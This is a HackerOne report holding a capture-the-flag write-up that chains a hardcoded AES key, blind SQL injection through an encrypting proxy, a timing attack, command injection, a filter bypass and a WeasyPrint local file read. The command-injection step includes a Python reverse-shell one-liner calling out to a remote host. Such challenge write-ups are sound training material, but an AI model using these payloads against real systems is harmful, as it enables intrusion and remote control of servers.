{"id":529371,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC81MjkzNzE=","url":"https://hackerone.com/reports/529371","title":"Writeup ","state":"Closed","substate":"resolved","severity_rating":"critical","readable_substate":"Resolved","created_at":"2019-04-05T18:39:53.473Z","submitted_at":"2019-04-05T18:39:53.473Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"bitk","url":"/bitk","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/siUZCCmeEyfu5NtbqSQPDXuq/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":38489,"url":"https://hackerone.com/50m-ctf","handle":"50m-ctf","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/038/489/ff893443bc2ef278fa8f0cdb64fb2f2322c8bcb7_original./3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/000/038/489/ff893443bc2ef278fa8f0cdb64fb2f2322c8bcb7_original./eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"paused","default_currency":"usd","awards_miles":false,"offers_bounties":false,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"50m-ctf","twitter_handle":null,"website":"https://hackerone.com/","about":null}},"has_bounty?":false,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":false,"disclosed_at":"2019-04-08T15:53:09.379Z","bug_reporter_agreed_on_going_public_at":null,"team_member_agreed_on_going_public_at":"2019-04-08T15:52:42.382Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"h1 50M  CTF\n===========\n\n\nThis is my solution for the h1 ctf.\n\nOn the 27th of february h1 posted this tweet:\n\n![](https://i.imgur.com/7Zlw4lx.png)\n\nSince there is no link no any sort of challenge I supposed the challenges is self contained inside this tweet.\n\nMy guess was the first clue is inside the embeded picture, and since the second one contain a flag, I started with this one.\n\nStep 1: Pixels\n--------------\n\nThe image look like this.\n\n\n![](https://i.imgur.com/LZqKy2n.jpg)\n\nThere is two way to extract the link for the next step:\n- Reading all the binary on the image\n- Extracting the hiden data using steganography tools like stegsolve\n\nAfter writing down all the binary code down, I did a small python script to display the output\n\n```python\nimport re\n\n# the whole binary string in the picture\nbinary_str = (\n    \"0111101001101100011010010110001000101011\"\n    \"0111100010011100010010111100101000101100\"\n    \"1101000101001011110010011101011111001111\"\n    \"0011000000101100110010010100100000101101\"\n    \"1100101000000101000000000010010111010010\"\n    \"0000010100101001\"\n) \n\n# split the full string into substring of 8 chars\nchar_regex = re.compile(\"[0,1]{8}\") \nchars = char_regex.findall(binary_str)\n\n# Convert the binary to int then to char\nzlib_txt = \"\".join(chr(int(c, 2)) for c in chars)\nprint(repr(zlib_txt))\n\n# Remove the hint \"zlib+\" and decode using zlib\nascii_txt = zlib_txt[5:].decode(\"zlib\")\nprint(ascii_txt)\n\n### output ###\n# 'zlib+x\\x9cK\\xca,\\xd1K\\xc9\\xd7\\xcf0,\\xc9H-\\xca\\x05\\x00%\\xd2\\x05)'\n# bit.do/h1therm\n##############\n```\n\nFollowing the link we get access to an APK\n\n\nStep 2: The APK\n---------------\n\nOnce open the apk greet you with a login page where it ask for username and password.\n\nUsing tools like dex2jar allow us to see the actual source code of the application. Let's look at the code to see how it communicate with the backend.\n\nWhen you touch the sign in button the function `attemptLogin` is called.\n\n```java\nprivate void attemptLogin()\n    throws Exception\n  {\n...\n  // A json Object is created with our username, password and the getTemp cmd\n  localObject = new JSONObject();\n  ((JSONObject)localObject).put(\"username\", username);\n  ((JSONObject)localObject).put(\"password\", password);\n  ((JSONObject)localObject).put(\"cmd\", \"getTemp\");\n  \n  // Is Object is then converted to a PayloadRequest before being sent\n  Volley.newRequestQueue(this).add(new PayloadRequest((JSONObject)localObject,new Response.Listener())\n\n\n...\n```\n\nThe PayloadRequest is an AES/CBC encrypted payload sent over HTTP Post.\n\nThe key is hardcoded and equal to  `[56, 79, 46, 106, 26, 5, 229, 34, 59, 128, 233, 96, 160, 166, 80, 116]` or `384f2e6a1a05e5223b80e960a0a65074`\n\n```java\n  public PayloadRequest(JSONObject paramJSONObject, Response.Listener\u003cString\u003e paramListener)\n    throws Exception\n  {\n    super(1, \"http://35.243.186.41/\", new Response.ErrorListener()\n    {\n      public void onErrorResponse(VolleyError paramAnonymousVolleyError)\n      {\n        PayloadRequest.this.onResponse(\"Connection failed\");\n      }\n    });\n    this.mListener = paramListener;\n    this.mParams = new HashMap();\n    this.mParams.put(\"d\", buildPayload(paramJSONObject));\n  }\n  \n  private String buildPayload(JSONObject paramJSONObject)\n    throws Exception\n  {\n    Object localObject = new SecretKeySpec(new byte[] { 56, 79, 46, 106, 26, 5, -27, 34, 59, -128, -23, 96, -96, -90, 80, 116 }, \"AES\");\n    byte[] arrayOfByte = new byte[16];\n    new SecureRandom().nextBytes(arrayOfByte);\n    IvParameterSpec localIvParameterSpec = new IvParameterSpec(arrayOfByte);\n    Cipher localCipher = Cipher.getInstance(\"AES/CBC/PKCS5Padding\");\n    localCipher.init(1, (Key)localObject, localIvParameterSpec);\n    paramJSONObject = localCipher.doFinal(paramJSONObject.toString().getBytes());\n    localObject = new byte[paramJSONObject.length + 16];\n    System.arraycopy(arrayOfByte, 0, localObject, 0, 16);\n    System.arraycopy(paramJSONObject, 0, localObject, 16, paramJSONObject.length);\n    return Base64.encodeToString((byte[])localObject, 0);\n  }\n}\n```\n\nNow we now how requests are made, it's just a JSON Post request with an encrypted Json object looking like this\n\n```json\n\n{\"d\": aes_encrypt({\"username\": \"alice\", \"password\": \"hunter2\", \"cmd\": \"getTemp\"})}\n\n```\nAnd using the same AES key we can read the response\n\n\nStep 3: Inject me\n-----------------\nAfter playing a bit with the api I noticed a Blind SQL injection vunerability.\nBecause I'm lazy I wanted to use sqlmap to extract the data, and because I was fighting a huge hangover I forgot about sqlmap  temper script. \nSo I choosed to make a small flask webserver to serv as a proxy for the real one, making all the required transformations.\n\n\n```python\nfrom Crypto import Random\nimport json\nimport base64\nimport requests\n\napp = Flask(__name__)\nURL = \"http://35.243.186.41/\"\n\nkey = \"\".join(\n    chr(x)\n    for x in [56, 79, 46, 106, 26, 5, 229, 34, 59, 128, 233, 96, 160, 166, 80, 116]\n)\nblock_size = AES.block_size\n\nunpad = lambda s: s[0 : -ord(s[-1])]\n\n\ndef pad(plain_text):\n    number_of_bytes_to_pad = block_size - len(plain_text) % block_size\n    ascii_string = chr(number_of_bytes_to_pad)\n    padding_str = number_of_bytes_to_pad * ascii_string\n    padded_plain_text = plain_text + padding_str\n    return padded_plain_text\n\n\ndef encode(obj):\n    iv = Random.new().read(AES.block_size)\n\n    js = json.dumps(obj)\n    padded_js = pad(js)\n    cipher = AES.new(key, AES.MODE_CBC, iv)\n    encrypted_text = cipher.encrypt(padded_js)\n\n    final = base64.b64encode(iv + encrypted_text)\n    return final\n\n\ndef decode(s):\n    x = s.decode(\"base64\")\n    iv, encrypted_text = x[:16], x[16:]\n    cipher = AES.new(key, AES.MODE_CBC, iv)\n    return cipher.decrypt(encrypted_text)\n\n\n@app.route(\"/\")\ndef index():\n\n\t# Get the username from the query\n    username = request.args.get(\"username\")\n\t\n\t# create a json object with our username and some valid data\n    payload = {\n\t\"username\": username,\n\t\"password\": \"password\",\n\t\"cmd\": \"getTemp\"\n    }\n\n    # Encrypt it with AES\n    data = {\"d\": encode(payload)}\n\n\n    # Send it to the real server\n    r = requests.post(URL, data=data).text\n\t\n\t# Decrypt and display the output\n    return unpad(decode(r))\n\n\nif __name__ == \"__main__\":\n    app.run(debug=True, threaded=False)\n\n```\nUsing this server and setting sqlmap to attack `http://localhost:5000?username=` I was able to easily extract two tables from the database\n\n#### Users\n| id|username|password|\n|:-:|:------:|:------:|\n|1|admin|5f4dcc3b5aa765d61d8327deb882cf99 (password)|\n\n#### Devices\n|id|ip|\n|:-:|:--:|\n1|192.88.99.253\n2|192.88.99.252\n...|......\n151|192.88.99.59\n\n\nUsing nmap to scan all the ip, only one seems to be up and running a HTTP server. \n\n\nStep 4: Timming is the key\n--------------------------\n\nOnce again we face a login page, this time it included a login.js file that calculating a hash of our username/password and sending it instead of our credentials.\n\nAfter spending waaaay to much time on reversing the hash function I realised that the server was responding differently if I sent a \"valid\" 64 chars long hash or a random string.\n\nThe difference was in the timming response, the valid hash always took 500ms more.\nThis look like a typical timming attack.\n\nThe checking function take a different amount of time to respond according to the number of valid byte. With this information I was able to make a simple python script to test all possible byte for the first char, save the value with the longest time to respond and continue until the end.\n\nThe valid hash was the following `f9865a4952a4f5d74b43f3558fed6a0225c6877fba60a250bcbde753f5db13`\n\n\nStep 5: RCE\n-----------\n\nOnce logged in we got access to an update page only displaying this message.\n\n```\nConnecting to http://update.flitethermostat:5000/ and downloading update manifest\n...\n...\n...\nCould not connect\n```\n\nI quickly noticed that you can submit a `port` parameter in your GET request to make the port change. But I didn't find any way to trigger an RCE or SSRF.\n\nI also tried to bruteforce some kind of host parameter but no luck.\n\nThe next day an user from the H1 discord channel (spaceraccoon) told me he found the host parameter it was `'update_host'`\n\n\nOkay, let's check to see if this parameter is vulnerable to some command injection.\n\n```\nGET /update?update_host=$(id)\n\nConnecting to http://uid=0(root) gid=0(root) groups=0(root)\nand downloading update manifest\n...\n...\n...\nCould not connect\n```\n\nPerfect!\nI now have root command execution on one of the server.\n\n\nStep 6: Pivoting for the win\n----------------------------------\n\nUsing a small python code I can start a remote shell on the remote server: \n\n```\nGET /update_host?update=$(python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"1.1.1.1\",12345));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/bash\",\"-pi\"]);')\n```\n\nWhile listening on my server with netcat\n(pro tip: use rlwrap around netcat for a better shell experience)\n\n```\n$\u003e rlwrap nc -l -p 12345 -v\nConnection from 0.0.0.0:59820\nbash-4.4# id \nuid=0(root) gid=0(root) groups=0(root)\nbash-4.4# \n```\n\nNow I got a shell but no flag on the machine. So I decided to install nmap and scan the network.\n\nnmap found an other machine running on 172.28.0.3 with an open port 80.\n\nTo make this easier I made a mirror of  the website using `wget  --mirror` to look at it from my own machine\n\n\n\nStep 7: HTML to PDF\n----------------------------------\n\nOne of the page on 172.28.0.3 was an invoice service doing HTML to PDF.\n\nThis is the data to send to the server to get a valid pdf.\n\n```json\n{\n  \"companyName\":\"BitK Inc\",\n  \"email\":\"bitk@bi.tk\",\n  \"invoiceNumber\":\"0001\",\n  \"date\":\"1970-01-01\",\n  \"items\":[\n    [\"1\", \"\", \"\", \"10\"]\n\t],\n  \"styles\": {\n\t\"body\":{\n\t  \"background-color\": \"white\"\n\t}\n  }\n}\n```\n\nYour are able to add any entry to the style element and it will be converted to css.\nSo instead of `\"background-color\":\"white\"` I put `\"background-image\": \"url(https://bi.tk/h1ctf)\"`\n\nAnd in my server log I saw a query to `/h1ctf` with the useragent `WeasyPrint 44 (http://weasyprint.org/)`.\n\nNow I know what tool is used to do this conversion. But the 44th version of WeasyPrint was the latest. Maybe there is a vulnerability inside WeasyPrint.\n\n\nAlso, while nearly all the fields where tested against HTML injection, It was possible to create a bogus style to close the tag and inject our own HTML.\nThe server try to remove any instance of `\u003c/style\u003e` in our request. To bypass this simply send `\u003c/st\u003c/style\u003eyle\u003e`, the `\u003c/style\u003e` in the middle will be removed, leaving you with only the closing tag.\n\n```json\n{\n  \"companyName\":\"BitK Inc\",\n  \"email\":\"bitk@bi.tk\",\n  \"invoiceNumber\":\"0001\",\n  \"date\":\"1970-01-01\",\n  \"items\":[\n    [\"1\", \"\", \"\", \"10\"]\n\t],\n  \"styles\": {\n\t\"\u003c/st\u003c/style\u003eyle\u003e\u003ch1\u003eInjected HTML\u003c/h1\u003e\":{\n\t  \"background-color\": \"white\"\n\t}\n  }\n}\n```\n\nBut weasyprint do not evaluate javascript anyway.\nFirst I tried to include localfile as images or font but without success.\n\n\nStep 8: Vulnerability as a feature\n----------------------------------\n\nAfter downloading and look at WeasyPrint source code I found an interesting feature.\n\nWeasprint has a special handler for links with `rel=attachment` If it find one, it will fetch the link and include it as a attachement in the generated pdf.\n\nUsing our injected html from before I create a link pointing to\n`/app/main.py` and get the file as an attachement of the pdf.\n\n\n\n\n```python\n\"\"\"\nCONGRATULATIONS!\n\nIf you're reading this, you've made it to the end of the road for this CTF.\n\nGo to https://hackerone.com/50m-ctf and submit your write up, including as much detail as you can.\nMake sure to include 'c8889970d9fb722066f31e804e351993' in the report, so we know for sure you made it through!\n\nCongratulations again, and I'm sorry for the red herrings. :)\n\"\"\"\n\n...\n```\n\n\nHere is the end of the CTF.\n\n\nHuge thanks to Cody for making this CTF. It was a lot of fun to solve and It was also nice to be in SF to be able to drink some beers with you afterwards\n\n## Impact\n\n-","vulnerability_information_html":"\u003ch1 id=\"h1-50m-ctf\"\u003eh1 50M  CTF\u003c/h1\u003e\n\n\u003cp\u003eThis is my solution for the h1 ctf.\u003c/p\u003e\n\n\u003cp\u003eOn the 27th of february h1 posted this tweet:\u003c/p\u003e\n\n\u003cp\u003e![](\u003ca title=\"https://i.imgur.com/7Zlw4lx.png\" href=\"/redirect?url=https%3A%2F%2Fi.imgur.com%2F7Zlw4lx.png\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://i.imgur.com/7Zlw4lx.png\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e)\u003c/p\u003e\n\n\u003cp\u003eSince there is no link no any sort of challenge I supposed the challenges is self contained inside this tweet.\u003c/p\u003e\n\n\u003cp\u003eMy guess was the first clue is inside the embeded picture, and since the second one contain a flag, I started with this one.\u003c/p\u003e\n\n\u003ch2 id=\"step-1-pixels\"\u003eStep 1: Pixels\u003c/h2\u003e\n\n\u003cp\u003eThe image look like this.\u003c/p\u003e\n\n\u003cp\u003e![](\u003ca title=\"https://i.imgur.com/LZqKy2n.jpg\" href=\"/redirect?url=https%3A%2F%2Fi.imgur.com%2FLZqKy2n.jpg\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://i.imgur.com/LZqKy2n.jpg\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e)\u003c/p\u003e\n\n\u003cp\u003eThere is two way to extract the link for the next step:\u003c/p\u003e\n\n\u003cul\u003e\n\u003cli\u003eReading all the binary on the image\u003c/li\u003e\n\u003cli\u003eExtracting the hiden data using steganography tools like stegsolve\u003c/li\u003e\n\u003c/ul\u003e\n\n\u003cp\u003eAfter writing down all the binary code down, I did a small python script to display the output\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight python\"\u003e\u003ccode\u003e\u003cspan class=\"kn\"\u003eimport\u003c/span\u003e \u003cspan class=\"nn\"\u003ere\u003c/span\u003e\n\n\u003cspan class=\"c1\"\u003e# the whole binary string in the picture\n\u003c/span\u003e\u003cspan class=\"n\"\u003ebinary_str\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\n    \u003cspan class=\"s\"\u003e\u0026quot;0111101001101100011010010110001000101011\u0026quot;\u003c/span\u003e\n    \u003cspan class=\"s\"\u003e\u0026quot;0111100010011100010010111100101000101100\u0026quot;\u003c/span\u003e\n    \u003cspan class=\"s\"\u003e\u0026quot;1101000101001011110010011101011111001111\u0026quot;\u003c/span\u003e\n    \u003cspan class=\"s\"\u003e\u0026quot;0011000000101100110010010100100000101101\u0026quot;\u003c/span\u003e\n    \u003cspan class=\"s\"\u003e\u0026quot;1100101000000101000000000010010111010010\u0026quot;\u003c/span\u003e\n    \u003cspan class=\"s\"\u003e\u0026quot;0000010100101001\u0026quot;\u003c/span\u003e\n\u003cspan class=\"p\"\u003e)\u003c/span\u003e \n\n\u003cspan class=\"c1\"\u003e# split the full string into substring of 8 chars\n\u003c/span\u003e\u003cspan class=\"n\"\u003echar_regex\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003ere\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"nb\"\u003ecompile\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;[0,1]{8}\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \n\u003cspan class=\"n\"\u003echars\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003echar_regex\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003efindall\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003ebinary_str\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\n\u003cspan class=\"c1\"\u003e# Convert the binary to int then to char\n\u003c/span\u003e\u003cspan class=\"n\"\u003ezlib_txt\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026quot;\u0026quot;\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003ejoin\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nb\"\u003echr\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nb\"\u003eint\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003ec\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"mi\"\u003e2\u003c/span\u003e\u003cspan class=\"p\"\u003e))\u003c/span\u003e \u003cspan class=\"k\"\u003efor\u003c/span\u003e \u003cspan class=\"n\"\u003ec\u003c/span\u003e \u003cspan class=\"ow\"\u003ein\u003c/span\u003e \u003cspan class=\"n\"\u003echars\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\u003cspan class=\"k\"\u003eprint\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nb\"\u003erepr\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003ezlib_txt\u003c/span\u003e\u003cspan class=\"p\"\u003e))\u003c/span\u003e\n\n\u003cspan class=\"c1\"\u003e# Remove the hint \u0026quot;zlib+\u0026quot; and decode using zlib\n\u003c/span\u003e\u003cspan class=\"n\"\u003eascii_txt\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003ezlib_txt\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"mi\"\u003e5\u003c/span\u003e\u003cspan class=\"p\"\u003e:]\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003edecode\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;zlib\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\u003cspan class=\"k\"\u003eprint\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eascii_txt\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\n\u003cspan class=\"c1\"\u003e### output ###\n# \u0026#39;zlib+x\\x9cK\\xca,\\xd1K\\xc9\\xd7\\xcf0,\\xc9H-\\xca\\x05\\x00%\\xd2\\x05)\u0026#39;\n# bit.do/h1therm\n##############\n\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eFollowing the link we get access to an APK\u003c/p\u003e\n\n\u003ch2 id=\"step-2-the-apk\"\u003eStep 2: The APK\u003c/h2\u003e\n\n\u003cp\u003eOnce open the apk greet you with a login page where it ask for username and password.\u003c/p\u003e\n\n\u003cp\u003eUsing tools like dex2jar allow us to see the actual source code of the application. Let\u0026#39;s look at the code to see how it communicate with the backend.\u003c/p\u003e\n\n\u003cp\u003eWhen you touch the sign in button the function \u003ccode\u003eattemptLogin\u003c/code\u003e is called.\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight java\"\u003e\u003ccode\u003e\u003cspan class=\"kd\"\u003eprivate\u003c/span\u003e \u003cspan class=\"kt\"\u003evoid\u003c/span\u003e \u003cspan class=\"nf\"\u003eattemptLogin\u003c/span\u003e\u003cspan class=\"o\"\u003e()\u003c/span\u003e\n    \u003cspan class=\"kd\"\u003ethrows\u003c/span\u003e \u003cspan class=\"nc\"\u003eException\u003c/span\u003e\n  \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003cspan class=\"o\"\u003e...\u003c/span\u003e\n  \u003cspan class=\"c1\"\u003e// A json Object is created with our username, password and the getTemp cmd\u003c/span\u003e\n  \u003cspan class=\"n\"\u003elocalObject\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"k\"\u003enew\u003c/span\u003e \u003cspan class=\"nc\"\u003eJSONObject\u003c/span\u003e\u003cspan class=\"o\"\u003e();\u003c/span\u003e\n  \u003cspan class=\"o\"\u003e((\u003c/span\u003e\u003cspan class=\"nc\"\u003eJSONObject\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e\u003cspan class=\"n\"\u003elocalObject\u003c/span\u003e\u003cspan class=\"o\"\u003e).\u003c/span\u003e\u003cspan class=\"na\"\u003eput\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;username\u0026quot;\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003eusername\u003c/span\u003e\u003cspan class=\"o\"\u003e);\u003c/span\u003e\n  \u003cspan class=\"o\"\u003e((\u003c/span\u003e\u003cspan class=\"nc\"\u003eJSONObject\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e\u003cspan class=\"n\"\u003elocalObject\u003c/span\u003e\u003cspan class=\"o\"\u003e).\u003c/span\u003e\u003cspan class=\"na\"\u003eput\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;password\u0026quot;\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003epassword\u003c/span\u003e\u003cspan class=\"o\"\u003e);\u003c/span\u003e\n  \u003cspan class=\"o\"\u003e((\u003c/span\u003e\u003cspan class=\"nc\"\u003eJSONObject\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e\u003cspan class=\"n\"\u003elocalObject\u003c/span\u003e\u003cspan class=\"o\"\u003e).\u003c/span\u003e\u003cspan class=\"na\"\u003eput\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;cmd\u0026quot;\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026quot;getTemp\u0026quot;\u003c/span\u003e\u003cspan class=\"o\"\u003e);\u003c/span\u003e\n\n  \u003cspan class=\"c1\"\u003e// Is Object is then converted to a PayloadRequest before being sent\u003c/span\u003e\n  \u003cspan class=\"nc\"\u003eVolley\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003enewRequestQueue\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"k\"\u003ethis\u003c/span\u003e\u003cspan class=\"o\"\u003e).\u003c/span\u003e\u003cspan class=\"na\"\u003eadd\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"k\"\u003enew\u003c/span\u003e \u003cspan class=\"nc\"\u003ePayloadRequest\u003c/span\u003e\u003cspan class=\"o\"\u003e((\u003c/span\u003e\u003cspan class=\"nc\"\u003eJSONObject\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e\u003cspan class=\"n\"\u003elocalObject\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e\u003cspan class=\"k\"\u003enew\u003c/span\u003e \u003cspan class=\"nc\"\u003eResponse\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003eListener\u003c/span\u003e\u003cspan class=\"o\"\u003e())\u003c/span\u003e\n\n\n\u003cspan class=\"o\"\u003e...\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eThe PayloadRequest is an AES/CBC encrypted payload sent over HTTP Post.\u003c/p\u003e\n\n\u003cp\u003eThe key is hardcoded and equal to  \u003ccode\u003e[56, 79, 46, 106, 26, 5, 229, 34, 59, 128, 233, 96, 160, 166, 80, 116]\u003c/code\u003e or \u003ccode\u003e384f2e6a1a05e5223b80e960a0a65074\u003c/code\u003e\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight java\"\u003e\u003ccode\u003e  \u003cspan class=\"kd\"\u003epublic\u003c/span\u003e \u003cspan class=\"nf\"\u003ePayloadRequest\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"nc\"\u003eJSONObject\u003c/span\u003e \u003cspan class=\"n\"\u003eparamJSONObject\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"nc\"\u003eResponse\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003eListener\u003c/span\u003e\u003cspan class=\"o\"\u003e\u0026lt;\u003c/span\u003e\u003cspan class=\"nc\"\u003eString\u003c/span\u003e\u003cspan class=\"o\"\u003e\u0026gt;\u003c/span\u003e \u003cspan class=\"n\"\u003eparamListener\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e\n    \u003cspan class=\"kd\"\u003ethrows\u003c/span\u003e \u003cspan class=\"nc\"\u003eException\u003c/span\u003e\n  \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n    \u003cspan class=\"kd\"\u003esuper\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"mi\"\u003e1\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026quot;http://35.243.186.41/\u0026quot;\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"k\"\u003enew\u003c/span\u003e \u003cspan class=\"nc\"\u003eResponse\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003eErrorListener\u003c/span\u003e\u003cspan class=\"o\"\u003e()\u003c/span\u003e\n    \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n      \u003cspan class=\"kd\"\u003epublic\u003c/span\u003e \u003cspan class=\"kt\"\u003evoid\u003c/span\u003e \u003cspan class=\"nf\"\u003eonErrorResponse\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"nc\"\u003eVolleyError\u003c/span\u003e \u003cspan class=\"n\"\u003eparamAnonymousVolleyError\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e\n      \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n        \u003cspan class=\"nc\"\u003ePayloadRequest\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003ethis\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003eonResponse\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;Connection failed\u0026quot;\u003c/span\u003e\u003cspan class=\"o\"\u003e);\u003c/span\u003e\n      \u003cspan class=\"o\"\u003e}\u003c/span\u003e\n    \u003cspan class=\"o\"\u003e});\u003c/span\u003e\n    \u003cspan class=\"k\"\u003ethis\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003emListener\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003eparamListener\u003c/span\u003e\u003cspan class=\"o\"\u003e;\u003c/span\u003e\n    \u003cspan class=\"k\"\u003ethis\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003emParams\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"k\"\u003enew\u003c/span\u003e \u003cspan class=\"nc\"\u003eHashMap\u003c/span\u003e\u003cspan class=\"o\"\u003e();\u003c/span\u003e\n    \u003cspan class=\"k\"\u003ethis\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003emParams\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003eput\u003c/span\u003e\u003cspan 